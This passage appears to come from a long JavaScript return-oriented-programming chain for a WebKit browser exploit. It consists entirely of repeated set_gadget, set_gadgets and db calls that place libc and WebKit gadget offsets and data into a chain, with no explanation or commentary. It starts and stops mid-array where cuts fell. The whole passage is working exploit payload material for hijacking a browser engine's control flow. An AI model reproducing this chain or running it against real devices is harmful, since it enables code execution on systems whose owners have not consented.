ropchain+233432, 
libc_base+811575, 
ropchain+238952, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+233528, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+233584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+233632, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+233736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+233752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+233904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+233936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+233920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+233888, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234120, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+234104, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+234200, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([32, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234368, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+234336, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+234536, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+234520, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+234656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+234704, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+234672, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+234816, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+234808, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+234832, 
ropchain+234848, 
libc_base+811575, 
ropchain+234864, 
libc_base+811575, 
ropchain+238744, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([25, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([41, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+235096, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+235200, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+235336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+235368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+235320, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+235456, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+235616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+235584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+235688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+235744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+235824, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+235928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+235944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+236096, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+236080, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+236288, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+236256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+236240, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+236360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236376, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+236464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+236520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+236640, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+236824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+236840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+236808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+236928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+236944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+237040, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+237024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+237144, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+245160, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+237280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+237264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+237400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+237416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+237560, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+237552, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+237576, 
ropchain+238024, 
libc_base+50775, 
libc_base+793877, 
ropchain+237632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+237800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+237816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+237784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+237904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+237920, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+238016, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+238000, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+238064, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+238168, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+238184, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+238336, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+238368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+238352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+238320, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+238464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+238448, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+238552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+238608, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294966264, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+238688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+233592, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397832, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+238904, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+243832, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+227344, 
libc_base+793877, 
ropchain+238992, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+239096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+239112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+239232, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+239264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+239216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+239352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+239368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+239520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+239552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+239536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+239504, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+239648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+239632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+239752, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+172824, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([65, 0]); 
set_gadget(libc_base+788575,); 
db([65, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397856, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+240032, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+240104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+240232, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+240216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+240312, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+240416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+240432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+240536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+240520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+240592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+240680, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+240784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+240800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+240920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+240952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+240904, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+241040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+241056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+241208, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241240, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+241224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+241192, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+241312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241328, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+241440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+241408, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+241568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+241552, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+241688, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+241752, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+241704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([1, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+241872, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+241864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+241888, 
ropchain+243064, 
libc_base+793877, 
ropchain+241928, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+242032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+242168, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+242152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([12, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+242288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242304, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+242456, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+242440, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+242560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242576, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+242688, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+242656, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
libc_base+793877, 
ropchain+242816, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+242800, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+242952, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+242984, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+242936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+243056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+243176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+243160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+243296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+243312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+243456, 
libc_base+547636, 
